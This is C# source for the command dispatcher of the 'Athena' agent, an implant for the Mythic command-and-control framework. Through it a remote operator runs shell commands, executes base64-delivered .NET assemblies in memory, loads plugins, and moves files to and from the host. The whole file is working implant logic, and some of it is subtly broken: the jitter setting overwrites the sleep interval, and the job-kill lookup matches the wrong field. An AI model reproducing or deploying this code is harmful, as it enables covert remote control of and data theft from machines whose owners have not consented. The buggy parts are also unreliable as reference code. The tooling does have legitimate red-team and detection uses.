using Athena.Commands.Model;
using Athena.Mythic.Model;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;

namespace Athena.Commands
{

    public class CommandHandler
    {
        public static void StartJob(MythicJob job)
        {
            //MythicJob job = Globals.jobs[task.task.id];
            //job.started = true;
            switch (job.task.command)
            {
                case "builtin":
                    checkAndRunPlugin(job);
                    break;
                case "download":
                    var downloadTask = Task.Run(() =>
                    {
                        MythicDownloadJob j = new MythicDownloadJob(job);
                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                        j.path = par["file"];

                        FileHandler.downloadFile(j);

                    });
                    break;
                case "execute-assembly":
                    Console.WriteLine("[Task] " + Globals.executeAssemblyTask);
                    if (Globals.executeAssemblyTask != "")
                    {
                        Console.WriteLine("errored.");
                        job.complete = true;
                        job.errored = true;
                        job.taskresult = "Failed to load assembly. Another assembly is already executing.";
                        job.hasoutput = true;
                    }
                    else
                    {
                        var t = Task.Run(() =>
                        {
                            job.cancellationtokensource.Token.ThrowIfCancellationRequested();
                            Globals.executeAssemblyTask = job.task.id;
                            ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                            job.taskresult = "";
                            job.hasoutput = true;
                            using (var consoleWriter = new ConsoleWriter()) {
                                var origStdout = Console.Out;
                                try
                                {
                                    consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
                                    //Set output for our ConsoleWriter
                                    Console.SetOut(consoleWriter);
                                    //Start a new thread for our blocking Execute-Assembly
                                    Globals.executeAseemblyThread = new Thread(() =>
                                    {
                                        try
                                        {
                                            job.hasoutput = true;
                                            AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), ea.arguments);
                                            //Assembly finished executing.
                                            Globals.executeAssemblyTask = "";
                                            job.complete = true;
                                            Console.SetOut(origStdout);
                                            return;
                                        }
                                        catch (Exception)
                                        {
                                            //Cancellation was requested, clean up.
                                            Globals.executeAssemblyTask = "";
                                            job.hasoutput = true;
                                            job.complete = true;
                                            job.errored = true;
                                            Console.SetOut(origStdout);
                                            Globals.alc.Unload();
                                            Globals.alc = new ExecuteAssemblyContext();
                                            return;
                                        }
                                    });
                                    
                                    Globals.executeAseemblyThread.IsBackground = true;
                                    
                                    //Start our assembly.
                                    Globals.executeAseemblyThread.Start();
                                }
                                catch(Exception e)
                                {
                                    Globals.executeAssemblyTask = "";
                                    job.complete = true;
                                    job.taskresult = e.Message;
                                    job.errored = true;
                                    job.hasoutput = true;
                                    Console.SetOut(origStdout);
                                }
                            }
                        }, job.cancellationtokensource.Token);
                    }
                    break;
                case "exit":
                    Environment.Exit(0);
                    break;
                case "jobs":
                    Task.Run(() => {
                        string output = "ID\t\t\t\t\t\tName\t\tStatus\r\n";
                        output += "-----------------------------------------------------------------------------------\r\n";
                        foreach (var job in Globals.jobs)
                        {
                            if (job.Value.started &! job.Value.complete)
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Started");
                            }
                            else if (job.Value.complete)
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Completed");
                            }
                            else
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Not Started");
                            }
                        }
                        job.hasoutput = true;
                        job.complete = true;
                        job.taskresult = output;
                    });
                    break;
                case "jobkill":
                    Task.Run(() =>
                    {
                        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == x.Value.task.parameters).Value;
                        if (job != null)
                        {
                            //Attempt the cancel.
                            job.cancellationtokensource.Cancel();
                            Globals.executeAseemblyThread.Interrupt();

                            //Wait to see if the cancel took.
                            for (int i = 0; i != 31; i++)
                            {
                                //Job exited successfully
                                if (job.complete)
                                {
                                    job.taskresult = $"Task {job.task.parameters} exited successfully.";
                                    job.complete = true;
                                    job.hasoutput = true;
                                    break;
                                }
                                //Job may have failed to cancel
                                if (i == 30 && !job.complete)
                                {
                                    job.taskresult = $"Unable to cancel Task: {job.task.parameters}. Request timed out.";
                                    job.complete = true;
                                    job.hasoutput = true;
                                    job.errored = true;
                                }
                                //30s timeout
                                Thread.Sleep(1000);
                            }
                        }
                        else
                        {
                            job.taskresult = $"Task {job.task.parameters} not found!";
                            job.complete = true;
                            job.hasoutput = true;
                        }
                    });
                    break;
                case "load":
                    LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name);
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                //Can these all be merged into one and handled on the server-side?
                case "load-assembly":
                    try
                    {
                        LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                        job.taskresult = AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly));
                    }
                    catch(Exception e)
                    {
                        job.taskresult = e.Message;
                        job.errored = true;
                    }
                    job.hasoutput = true;
                    job.complete = true;
                    break;
                case "reset-assembly-context":
                    job.taskresult = AssemblyHandler.ClearAssemblyLoadContext();
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                case "shell":
                    Execution.ShellExec(job);
                    break;
                case "sleep":
                    var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
                    if (sleepInfo.ContainsKey("sleep"))
                    {
                        try
                        {
                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["sleep"].ToString());
                        }
                        catch
                        {
                            job.taskresult += "Invalid sleeptime specified.";
                            job.errored = true;
                        }
                    }
                    if (sleepInfo.ContainsKey("jitter"))
                    {
                        try
                        {
                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["jitter"].ToString());
                        }
                        catch
                        {
                            job.taskresult += "Invalid jitter specified.";
                            job.errored = true;
                        }
                    }
                    if (!job.errored)
                    {
                        job.taskresult = "Sleep updated successfully.";
                    }
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                case "stop-assembly":
                    //Will need to make this work
                    if(Globals.executeAseemblyThread != null)
                    {
                        Globals.executeAseemblyThread.Interrupt();
                        //Globals.executeAseemblyThread.Abort();
                        Thread.Sleep(3000);
                        if (Globals.executeAseemblyThread.IsAlive)
                        {
                            //Globals.executeAseemblyThread.Suspend();
                        }

                        job.complete = true;
                        job.taskresult = "Cancellation Requested.";
                        job.hasoutput = true;
                        Globals.executeAssemblyTask = "";
                        Globals.alc.Unload();
                    }
                    else
                    {
                        job.complete = true;
                        job.taskresult = "No execute-assembly task currently running.";
                        job.hasoutput = true;
                    }
                    break;
                case "upload":
                    //This doesn't task from mythic for some reason
                    var uploadTask = Task.Run(() =>
                    {
                        try
                        {
                            if (!Globals.uploadJobs.ContainsKey(job.task.id)){
                                MythicUploadJob uj = new MythicUploadJob(job);
                                Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
                                uj.path = par["remote_path"];
                                uj.file_id = par["file"];
                                uj.task = job.task;
                                uj.chunk_num = 1;
                                job.started = true;
                                job.hasoutput = true;
                                job.taskresult = "";
                                
                                //Add job to job tracking Dictionary
                                Globals.uploadJobs.Add(uj.task.id, uj);

                                while(uj.total_chunks == 0)
                                {
                                    //wait for total_chunks to be populated.
                                }

                                while(uj.chunk_num != uj.total_chunks+1)
                                {
                                    if (!uj.locked && uj.chunkUploads.Count() > 0)
                                    {
                                        try
                                        {
                                            Console.WriteLine($"Writing Chunk: {uj.chunk_num}/{uj.total_chunks}");
                                            Misc.AppendAllBytes(uj.path, Misc.Base64DecodeToByteArray(uj.chunkUploads[uj.chunk_num]));
                                            //Finished with chunk, remove it.
                                            uj.chunkUploads.Remove(uj.chunk_num);
                                            uj.chunk_num++;
                                            job.hasoutput = true;
                                            job.taskresult = "";
                                            uj.uploadStarted = true;
                                        }
                                        catch (Exception e)
                                        {
                                            job.complete = true;
                                            job.taskresult = e.Message;
                                            job.hasoutput = true;
                                            uj.complete = true;
                                        }

                                    }
                                }
                                job.complete = true;
                                job.taskresult = "File Uploaded Successfully.";
                                job.hasoutput = true;
                                uj.complete = true;
                            }
                        }
                        catch (Exception e)
                        {
                            job.taskresult = e.Message;
                            job.complete = true;
                            job.hasoutput = true;
                            job.errored = true;
                        }

                    });
                    break;
                default:
                    checkAndRunPlugin(job);
                    break;
            }
        }

        static void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
        {
            try
            {
                MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == Globals.executeAssemblyTask).Value;
                job.taskresult += e.Value + Environment.NewLine;
                job.hasoutput = true;
            }
            catch (Exception)
            {
                //Fail silently
            }
        }

        static void checkAndRunPlugin(MythicJob job)
        {
            if (Globals.loadedcommands.ContainsKey(job.task.command))
            {
                job.taskresult =  AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                job.complete = true;
                job.hasoutput = true;
                if (job.taskresult.StartsWith("[ERROR]"))
                {
                    job.errored = true;
                    job.taskresult = job.taskresult.Replace("[ERROR]", "");
                }
            }
            else
            {
                job.errored = true;
                job.taskresult = "Plugin not loaded. Please use the load command to load the plugin!";
            }
        }
    }
}
